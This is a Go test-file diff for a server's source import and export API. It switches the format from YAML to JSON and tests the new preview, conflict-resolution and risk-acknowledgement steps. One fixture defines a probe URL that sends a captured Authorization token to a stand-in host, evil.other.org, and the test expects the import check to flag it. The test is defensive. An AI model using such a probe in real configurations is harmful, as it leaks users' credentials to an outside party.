@@ -3,10 +3,13 @@ package server
 import (
 	"io"
 	"net/http"
+	"net/http/httptest"
 	"strings"
 	"testing"
 
+	"github.com/lonelyman0108/ferry/internal/probe"
 	"github.com/lonelyman0108/ferry/internal/source"
+	"github.com/lonelyman0108/ferry/internal/store"
 )
 
 func TestSourceLifecycle(t *testing.T) {
@@ -87,28 +90,36 @@ func TestSourceLifecycle(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	yamlText, _ := io.ReadAll(resp.Body)
+	jsonText, _ := io.ReadAll(resp.Body)
 	resp.Body.Close()
-	if resp.StatusCode != 200 || !strings.Contains(string(yamlText), "key: ninebot") || !strings.Contains(resp.Header.Get("Content-Disposition"), "ferry-ninebot.yaml") {
-		t.Fatalf("导出 = %d %q", resp.StatusCode, yamlText)
+	if resp.StatusCode != 200 || !strings.Contains(string(jsonText), `"key": "ninebot"`) || !strings.Contains(resp.Header.Get("Content-Disposition"), "ferry-ninebot.json") {
+		t.Fatalf("导出 = %d %q", resp.StatusCode, jsonText)
 	}
 	if code := h.do("DELETE", "/api/v1/sources/"+id, nil, nil); code != 200 {
 		t.Fatalf("删除 = %d", code)
 	}
-	if code := h.do("POST", "/api/v1/sources/import", map[string]string{"yaml": string(yamlText)}, &created); code != 201 {
-		t.Errorf("导出的 YAML 再导入 = %d", code)
+
+	var preview importPreviewOutput
+	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"text": string(jsonText)}, &preview); code != 200 || len(preview.Items) != 1 || !preview.Items[0].Valid {
+		t.Fatalf("预览导出的 JSON = %d %+v", code, preview)
 	}
+	var applied importApplyOutput
+	applyIn := importApplyInput{Items: []importApplyItem{{Meta: preview.Items[0].Meta, Source: preview.Items[0].Source}}}
+	if code := h.do("POST", "/api/v1/sources/import", applyIn, &applied); code != 200 || applied.Succeeded != 1 || len(applied.Results) != 1 || !applied.Results[0].OK {
+		t.Fatalf("导出的 JSON 再导入 = %d %+v", code, applied)
+	}
+
 	var importErr errorBody
-	if code := h.do("POST", "/api/v1/sources/import", map[string]string{"yaml": "key: [oops"}, &importErr); code != 400 {
-		t.Errorf("坏 YAML = %d", code)
+	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"text": "{oops"}, &importErr); code != 400 {
+		t.Errorf("坏 JSON = %d", code)
 	}
-	// 语法正确、定义不合法的 YAML 同样返回 details 和带位置的 problems。
-	importErr = errorBody{}
-	badDoc := "key: other\nname: 其他\nmatchers:\n  - name: main\n    host: \"\"\nfields: []\n"
-	if code := h.do("POST", "/api/v1/sources/import", map[string]string{"yaml": badDoc}, &importErr); code != 400 ||
-		importErr.Error != "来源定义有误" || len(importErr.Details) != 2 || len(importErr.Problems) != 2 ||
-		importErr.Problems[0].Path != "matchers[0].host" || importErr.Problems[1].Path != "fields" {
-		t.Errorf("不合法的 YAML 定义 = %d %+v", code, importErr)
+	// 外壳合法、来源定义不合法的 JSON 在预览结果中逐条返回 details 和带位置的 problems。
+	badDoc := `{"format":1,"meta":{"version":1},"source":{"key":"other","name":"其他","matchers":[{"name":"main","host":""}],"fields":[]}}`
+	preview = importPreviewOutput{}
+	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"text": badDoc}, &preview); code != 200 ||
+		len(preview.Items) != 1 || preview.Items[0].Valid || len(preview.Items[0].Details) != 2 || len(preview.Items[0].Problems) != 2 ||
+		preview.Items[0].Problems[0].Path != "matchers[0].host" || preview.Items[0].Problems[1].Path != "fields" {
+		t.Errorf("不合法的 JSON 定义 = %d %+v", code, preview)
 	}
 
 	var list []sourceSummary
@@ -125,5 +136,136 @@ func TestSourceLifecycle(t *testing.T) {
 	}
 	if code := bearer.do("POST", "/api/v1/examples/ninebot/import", map[string]any{}, nil, "Authorization", "Bearer "+tok.Token); code != 403 {
 		t.Errorf("令牌写来源 = %d，期望 403", code)
+	}
+}
+
+func TestSourcesImportPreviewAndApply(t *testing.T) {
+	h := ready(t)
+
+	// 先导入九号示例，并写入一条身份与版本记录，用来验证覆盖更新时身份与版本保留。
+	var created sourceView
+	if code := h.do("POST", "/api/v1/examples/ninebot/import", map[string]any{}, &created); code != 201 {
+		t.Fatalf("导入示例 = %d", code)
+	}
+	db := h.srv.store().DB
+	ident := store.Identity{SourceID: created.ID, Key: "DEV-100"}
+	if err := db.Create(&ident).Error; err != nil {
+		t.Fatal(err)
+	}
+
+	// 准备远程 HTTP 服务提供包含 2 个条目的 JSON 数组：第 1 项与 ninebot 冲突且修改了描述，第 2 项违反探测域名硬规则。
+	modifiedDoc := created.Doc
+	modifiedDoc.Description = "更新后的说明"
+	riskyDoc := source.Doc{
+		Key:    "risky",
+		Name:   "外部探测来源",
+		Notify: source.NotifyChanged,
+		Debug:  true,
+		Matchers: []source.MatcherDoc{
+			{Name: "api", Host: "api.example.com"},
+		},
+		Fields: []source.FieldDoc{
+			{Key: "token", In: "header", Path: "Authorization"},
+		},
+		Probe: &probe.Spec{
+			URL:    "https://evil.other.org/check?t={{.token}}",
+			Expect: "status == 200",
+		},
+	}
+	env1, err := source.MarshalEnvelope(modifiedDoc, source.Meta{Version: 2, Tags: []string{"出行"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	env2, err := source.MarshalEnvelope(riskyDoc, source.Meta{Version: 1})
+	if err != nil {
+		t.Fatal(err)
+	}
+	batchJSON := "[" + string(env1) + "," + string(env2) + "]"
+
+	remote := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path == "/redirect-ftp" {
+			http.Redirect(w, r, "ftp://example.com/file.json", http.StatusFound)
+			return
+		}
+		w.Header().Set("Content-Type", "application/json")
+		_, _ = w.Write([]byte(batchJSON))
+	}))
+	defer remote.Close()
+
+	// 非法跳转协议应被拦截。
+	var badRedirect errorBody
+	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"url": remote.URL + "/redirect-ftp"}, &badRedirect); code != 400 {
+		t.Errorf("跳转到 ftp 应返回 400，实际 = %d", code)
+	}
+
+	// 链接预览应返回 2 个条目：第 1 项提示 key 冲突与本地差异，第 2 项提示硬规则违规与警告。
+	var preview importPreviewOutput
+	if code := h.do("POST", "/api/v1/sources/import/preview", map[string]string{"url": remote.URL + "/sources.json"}, &preview); code != 200 {
+		t.Fatalf("链接预览 = %d", code)
+	}
+	if len(preview.Items) != 2 {
+		t.Fatalf("预览条目数 = %d", len(preview.Items))
+	}
+	if !preview.Items[0].Conflict || !preview.Items[0].LocalModified || preview.Items[0].ExistingID != created.ID {
+		t.Errorf("第 1 项冲突状态不对：%+v", preview.Items[0])
+	}
+	if len(preview.Items[1].Violations) == 0 || len(preview.Items[1].Warnings) != 2 {
+		t.Errorf("第 2 项应包含硬规则违规和 2 条警告：%+v", preview.Items[1])
+	}
+
+	// 未勾选风险确认时，第 2 项应当失败，第 1 项选择覆盖更新应当成功，且保留原身份记录。
+	applyReq := importApplyInput{
+		Items: []importApplyItem{
+			{
+				Meta:     preview.Items[0].Meta,
+				Source:   preview.Items[0].Source,
+				Conflict: conflictOverwrite,
+			},
+			{
+				Meta:        preview.Items[1].Meta,
+				Source:      preview.Items[1].Source,
+				Acknowledge: false,
+			},
+		},
+	}
+	var applyOut importApplyOutput
+	if code := h.do("POST", "/api/v1/sources/import", applyReq, &applyOut); code != 200 {
+		t.Fatalf("执行导入 = %d", code)
+	}
+	if applyOut.Succeeded != 1 || applyOut.Failed != 1 || !applyOut.Results[0].OK || applyOut.Results[0].Action != "updated" || applyOut.Results[1].OK {
+		t.Fatalf("导入结果不对：%+v", applyOut)
+	}
+
+	// 验证覆盖更新后原身份仍然存在，且描述已更新。
+	var count int64
+	db.Model(&store.Identity{}).Where("source_id = ?", created.ID).Count(&count)
+	if count != 1 {
+		t.Errorf("覆盖更新后身份记录数 = %d，期望保留 1 条", count)
+	}
+	var updatedView sourceView
+	h.do("GET", "/api/v1/sources/"+itoa(created.ID), nil, &updatedView)
+	if updatedView.Description != "更新后的说明" {
+		t.Errorf("覆盖更新后 Description = %q", updatedView.Description)
+	}
+
+	// 测试冲突改用新 key 另存，以及勾选风险确认后导入第 2 项。
+	applyReq2 := importApplyInput{
+		Items: []importApplyItem{
+			{
+				Meta:     preview.Items[0].Meta,
+				Source:   preview.Items[0].Source,
+				Conflict: conflictRename,
+				NewKey:   "ninebot_backup",
+			},
+			{
+				Meta:        preview.Items[1].Meta,
+				Source:      preview.Items[1].Source,
+				Acknowledge: true,
+			},
+		},
+	}
+	applyOut = importApplyOutput{}
+	if code := h.do("POST", "/api/v1/sources/import", applyReq2, &applyOut); code != 200 || applyOut.Succeeded != 2 || applyOut.Failed != 0 {
+		t.Fatalf("改名与确认风险后导入 = %d %+v", code, applyOut)
 	}
 }
